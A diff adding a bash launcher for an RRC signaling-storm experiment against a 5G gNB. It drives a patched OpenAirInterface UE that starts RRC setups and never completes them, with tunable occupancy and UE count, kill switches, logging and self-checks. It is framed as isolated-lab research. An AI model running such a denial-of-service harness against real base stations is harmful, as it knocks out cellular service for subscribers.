@@ -1,0 +1,214 @@
+#!/usr/bin/env bash
+# rss-run — run one RRC signaling storm experiment against your own gNB.
+#
+#   ISOLATED LAB USE ONLY. This generates RRC setup attempts that are never
+#   completed, which consumes connection state on the target base station.
+#   Run it only inside an RF-shielded or virtual-RF testbed you own.
+#
+# Everything is configurable. Precedence: command line > conf/rss.conf >
+# environment > built-in default (the conf file is sourced first, so a key set
+# there wins over an exported variable). See README.en.md.
+set -euo pipefail
+
+HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+CONF="${RSS_CONF:-$HERE/conf/rss.conf}"
+if [[ -f "$CONF" ]]; then
+  # A broken line in the conf file (bad quoting, a stray command) would
+  # otherwise abort the script with no message at all, because `set -e` sees
+  # the failed source. Say what happened instead.
+  # shellcheck source=/dev/null
+  . "$CONF" || { echo "cannot load $CONF — a line in it failed. Check quoting, e.g. GNB_RESTART_CMD='/path/script start'" >&2; exit 1; }
+fi
+
+# ---- attack parameters (all overridable) ------------------------------------
+ENABLE=${ENABLE:-0}                  # 0 = regression (normal UE), 1 = attack
+NUM_UES=${NUM_UES:-1}                # attacker UE instances sharing the radio
+INTERVAL_MS=${INTERVAL_MS:-0}        # delay between a skipped Msg5 and the next try
+MAX_DURATION_S=${MAX_DURATION_S:-60} # in-process kill switch, 0 = run until stopped
+TARGET_OCCUPANCY=${TARGET_OCCUPANCY:-0}  # hold this many incomplete contexts, 0 = unlimited
+HOLD_MS=${HOLD_MS:-2000}             # gNB hold time per context, used by the controller
+COMPLETION_PCT=${COMPLETION_PCT:-0}  # percent of attempts completed normally
+HONOR_REJECT=${HONOR_REJECT:-1}      # obey RRCReject waitTime
+ACK_GATE=${ACK_GATE:-1}              # do not restart RA while the Msg4 ACK is pending
+RA_GATE=${RA_GATE:-1}                # do not restart RA while one is in flight
+GATE_TIMEOUT_MS=${GATE_TIMEOUT_MS:-500}
+MSG4_WAIT=${MSG4_WAIT:-1}            # 1 = A-type. 0 produces no gNB load, see README.en.md
+RUN_ID=${RUN_ID:-}
+
+# ---- radio / UE sharing (environment knobs read by the patched UE) ----------
+export RSS_ZMQ_TX_WAIT_US=${RSS_ZMQ_TX_WAIT_US:--2}
+export RSS_SHARE_LOCKSTEP=${RSS_SHARE_LOCKSTEP:-1}
+export RSS_SHARE_WR_MONOTONIC=${RSS_SHARE_WR_MONOTONIC:-0}
+
+# ---- local paths and cell --------------------------------------------------
+OAI=${OAI:-/root/OAI}
+UE_BIN=${UE_BIN:-$OAI/cmake_targets/ran_build/build/nr-uesoftmodem}
+UE_CFG=${UE_CFG:-/root/oai_nrue.conf}
+UECAP=${UECAP:-$OAI/targets/PROJECTS/GENERIC-NR-5GC/CONF/uecap_ports1.xml}
+LOGDIR=${LOGDIR:-/root/rss-runs}
+BAND=${BAND:-78}
+DL_FREQ=${DL_FREQ:-3489420000}
+NUMEROLOGY=${NUMEROLOGY:-1}
+PRB=${PRB:-51}
+ZMQ_TX=${ZMQ_TX:-tcp://127.0.0.1:4557}
+ZMQ_RX=${ZMQ_RX:-tcp://127.0.0.1:4556}
+DEVICE=${DEVICE:-oai_zmqdevif}
+UE_EXTRA=${UE_EXTRA:-}
+UE_TASKSET=${UE_TASKSET:-}
+GNB_TASKSET=${GNB_TASKSET:-}
+
+# Optional: command that restarts your gNB/DU. ZMQ virtual radio needs the DU
+# and the UE to start together, so leave this set on a ZMQ testbed. On a real
+# SDR you can leave it empty.
+GNB_RESTART_CMD=${GNB_RESTART_CMD:-}
+GNB_STOP_CMD=${GNB_STOP_CMD:-}
+
+usage() {
+  cat <<EOF
+usage: $0 [options]
+  -e 0|1   attack off/on                     (ENABLE, now $ENABLE)
+  -u N     attacker UE instances             (NUM_UES, now $NUM_UES)
+  -i MS    interval between attempts         (INTERVAL_MS, now $INTERVAL_MS)
+  -d SEC   kill switch, 0 = unlimited        (MAX_DURATION_S, now $MAX_DURATION_S)
+  -o N     target occupancy, 0 = unlimited   (TARGET_OCCUPANCY, now $TARGET_OCCUPANCY)
+  -H MS    gNB hold time for the controller  (HOLD_MS, now $HOLD_MS)
+  -c PCT   percent completed normally        (COMPLETION_PCT, now $COMPLETION_PCT)
+  -r 0|1   honor RRCReject waitTime          (HONOR_REJECT, now $HONOR_REJECT)
+  -g 0|1   Msg4 HARQ ACK gate                (ACK_GATE, now $ACK_GATE)
+  -G 0|1   random access gate                (RA_GATE, now $RA_GATE)
+  -M 0|1   wait for Msg4 (keep 1)            (MSG4_WAIT, now $MSG4_WAIT)
+  -n ID    run id                            (RUN_ID)
+  -h       this help
+Every option has an environment variable of the same name; conf/rss.conf sets
+defaults. See README.en.md for the full list including radio knobs.
+EOF
+  exit "${1:-1}"
+}
+
+while getopts "e:u:i:d:o:H:c:r:g:G:M:n:h" opt; do case "$opt" in
+  e) ENABLE=$OPTARG;; u) NUM_UES=$OPTARG;; i) INTERVAL_MS=$OPTARG;;
+  d) MAX_DURATION_S=$OPTARG;; o) TARGET_OCCUPANCY=$OPTARG;; H) HOLD_MS=$OPTARG;;
+  c) COMPLETION_PCT=$OPTARG;; r) HONOR_REJECT=$OPTARG;; g) ACK_GATE=$OPTARG;;
+  G) RA_GATE=$OPTARG;; M) MSG4_WAIT=$OPTARG;; n) RUN_ID=$OPTARG;;
+  h) usage 0;; *) usage;;
+esac; done
+
+[[ $ENABLE == 0 || $ENABLE == 1 ]] || { echo "-e must be 0 or 1" >&2; exit 1; }
+(( NUM_UES >= 1 )) || { echo "-u must be >= 1" >&2; exit 1; }
+(( MAX_DURATION_S >= 0 && MAX_DURATION_S <= 86400 )) || { echo "-d must be 0..86400" >&2; exit 1; }
+[[ -x $UE_BIN ]] || { echo "UE binary not found: $UE_BIN  (run bin/rss-build first)" >&2; exit 1; }
+
+if [[ -z $RUN_ID ]]; then
+  RUN_ID="$([[ $ENABLE == 1 ]] && echo A || echo base)u$NUM_UES-$(date -u +%Y%m%dT%H%M%SZ)"
+fi
+
+[[ $RUN_ID =~ ^[a-zA-Z0-9][a-zA-Z0-9._-]*$ ]] \
+  || { echo "run_id must start with a letter or digit and contain only letters, digits, '.', '_' or '-'" >&2; exit 1; }
+
+# Upstream OAI config bug (2026.w38, common/config/config_load_configmodule.c):
+# the -O scan tests only argv[i][1] == 'O' with no check for a leading '-', so
+# ANY argument whose second character is 'O' is taken as the -O option and the
+# next argument becomes the config file path. A run id like "CONF-1234" kills
+# the UE at startup with "error: file --rss.log_file does not exist".
+if [[ ${RUN_ID:1:1} == O ]]; then
+  echo "run_id '$RUN_ID': second character must not be 'O' (OAI -O parsing bug)" >&2
+  exit 1
+fi
+
+OUT="$LOGDIR/$RUN_ID"
+[[ -d $LOGDIR ]] || mkdir -p -- "$LOGDIR"
+mkdir -- "$OUT" \
+  || { echo "cannot create new run directory $OUT — existing results are never overwritten" >&2; exit 1; }
+JSONL="$OUT/attempts.jsonl"
+UE_LOG="$OUT/ue.log"
+
+cat > "$OUT/run.json" <<EOF
+{"type":"run","run_id":"$RUN_ID","scenario":"$([[ $ENABLE == 1 ]] && echo A || echo baseline)",
+ "rf_path":"$DEVICE","ue_base":"$(git -C "$OAI" rev-parse --short HEAD 2>/dev/null || echo unknown)",
+ "ue_branch":"$(git -C "$OAI" branch --show-current 2>/dev/null || echo unknown)",
+ "cell":{"band":"$BAND","dl_freq_hz":$DL_FREQ,"numerology":$NUMEROLOGY,"prb":$PRB},
+ "knobs":{"enable":$ENABLE,"num_ues":$NUM_UES,"interval_ms":$INTERVAL_MS,
+          "max_duration_s":$MAX_DURATION_S,"target_occupancy":$TARGET_OCCUPANCY,
+          "hold_ms":$HOLD_MS,"completion_pct":$COMPLETION_PCT,
+          "honor_reject":$HONOR_REJECT,"ack_gate":$ACK_GATE,"ra_gate":$RA_GATE,
+          "gate_timeout_ms":$GATE_TIMEOUT_MS,"msg4_wait":$MSG4_WAIT},
+ "radio":{"zmq_tx_wait_us":$RSS_ZMQ_TX_WAIT_US,"share_lockstep":$RSS_SHARE_LOCKSTEP,
+          "share_wr_monotonic":$RSS_SHARE_WR_MONOTONIC},
+ "t_start_utc":"$(date -u +%FT%TZ)"}
+EOF
+
+echo "== $RUN_ID  attack=$ENABLE ue=$NUM_UES interval=${INTERVAL_MS}ms target_occ=$TARGET_OCCUPANCY kill=${MAX_DURATION_S}s"
+
+# 1. restart the gNB together with the UE. NOTE: never pipe this command. A
+#    pipeline can block forever because the pipe's write end stays open after
+#    the command returns, so the reader never sees EOF. Redirect to a file.
+if [[ -n $GNB_STOP_CMD ]]; then
+  bash -c "$GNB_STOP_CMD" >"$OUT/gnb_stop.txt" 2>&1 </dev/null || true
+fi
+if [[ -n $GNB_RESTART_CMD ]]; then
+  echo "== restarting gNB"
+  bash -c "$GNB_RESTART_CMD" >"$OUT/gnb_boot.txt" 2>&1 </dev/null \
+    || { echo "   !! gNB restart failed"; tail -8 "$OUT/gnb_boot.txt"; exit 1; }
+  sed -n '1,6p' "$OUT/gnb_boot.txt"
+fi
+
+if [[ -n $GNB_TASKSET ]]; then
+  for p in $(pgrep -x odu || pgrep -x gnb || true); do
+    taskset -apc "$GNB_TASKSET" "$p" >/dev/null 2>&1 || true
+  done
+  echo "== pinned gNB -> cores $GNB_TASKSET"
+fi
+
+PIN=()
+[[ -n $UE_TASKSET ]] && PIN=(taskset -c "$UE_TASKSET") && echo "== pinned UE -> cores $UE_TASKSET"
+EXTRA=()
+[[ -n $UE_EXTRA ]] && read -r -a EXTRA <<< "$UE_EXTRA"
+
+ARGS=(-O "$UE_CFG" --band "$BAND" -C "$DL_FREQ" --numerology "$NUMEROLOGY" -r "$PRB"
+      -E --ue-scan-carrier --uecap_file "$UECAP" --device.name "$DEVICE"
+      '--zmq.[0].tx_channels' "$ZMQ_TX" '--zmq.[0].rx_channels' "$ZMQ_RX"
+      --num-ues "$NUM_UES"
+      --rss.enable "$ENABLE" --rss.interval_ms "$INTERVAL_MS"
+      --rss.max_duration_s "$MAX_DURATION_S" --rss.completion_pct "$COMPLETION_PCT"
+      --rss.honor_reject "$HONOR_REJECT" --rss.ack_gate "$ACK_GATE"
+      --rss.ra_gate "$RA_GATE" --rss.gate_timeout_ms "$GATE_TIMEOUT_MS"
+      --rss.target_occupancy "$TARGET_OCCUPANCY" --rss.hold_ms "$HOLD_MS"
+      --rss.msg4_wait "$MSG4_WAIT"
+      --rss.run_id "$RUN_ID" --rss.log_file "$JSONL" "${EXTRA[@]}")
+
+echo "== launching UE (log: $UE_LOG)"
+rc=0
+if (( MAX_DURATION_S > 0 )); then
+  # Two independent kill switches: the in-process one and this outer timeout.
+  timeout --signal=INT --kill-after=10 "$((MAX_DURATION_S + 20))" \
+    "${PIN[@]}" "$UE_BIN" "${ARGS[@]}" >"$UE_LOG" 2>&1 </dev/null || rc=$?
+else
+  echo "   unlimited run: stop with  pkill -INT -x nr-uesoftmodem"
+  "${PIN[@]}" "$UE_BIN" "${ARGS[@]}" >"$UE_LOG" 2>&1 </dev/null || rc=$?
+fi
+# Do not call every non-zero exit "the kill switch": a crash is a crash and the
+# run is then invalid. 124 = outer timeout, 130/2 = SIGINT, 139 = SIGSEGV.
+CRASHED=0
+case $rc in
+  0)      ;;
+  2|130)  echo "   (UE stopped by SIGINT — the in-process kill switch, or you)";;
+  124)    echo "   (outer timeout fired at $((MAX_DURATION_S + 20)) s)";;
+  137)    echo "   (UE killed with SIGKILL)";;
+  139)    echo "   !! UE CRASHED (SIGSEGV, rc=139). This run is INVALID — read $UE_LOG"; CRASHED=1;;
+  *)      echo "   (UE exited rc=$rc)";;
+esac
+pkill -9 -x nr-uesoftmodem 2>/dev/null || true
+
+echo "{\"t_stop_utc\":\"$(date -u +%FT%TZ)\"}" > "$OUT/run_stop.json"
+
+echo "== self-check"
+(( CRASHED )) && echo "   !! the UE crashed, so every number below is from a partial run"
+if [[ $ENABLE == 1 ]]; then
+  grep -m1 '\[RSS\]' "$UE_LOG" || echo "   !! no [RSS] banner: knobs were NOT parsed, run is invalid"
+fi
+printf '   attempts   %s\n' "$(grep -c '"event":"attempt_start"' "$JSONL" 2>/dev/null || echo 0)"
+printf '   msg5_skip  %s\n' "$(grep -c 'msg5_skip' "$JSONL" 2>/dev/null || echo 0)"
+printf '   ch.timeout %s\n' "$(grep -c 'Error, channel timeout' "$UE_LOG" 2>/dev/null || echo 0)"
+grep -E 'shared TX:|cursors aligned' "$UE_LOG" 2>/dev/null | tail -2 || true
+echo "== artifacts in $OUT"
+echo "   next: on the CU/gNB host   bin/rss-report --since <HH:MM:SS> --until <HH:MM:SS>"
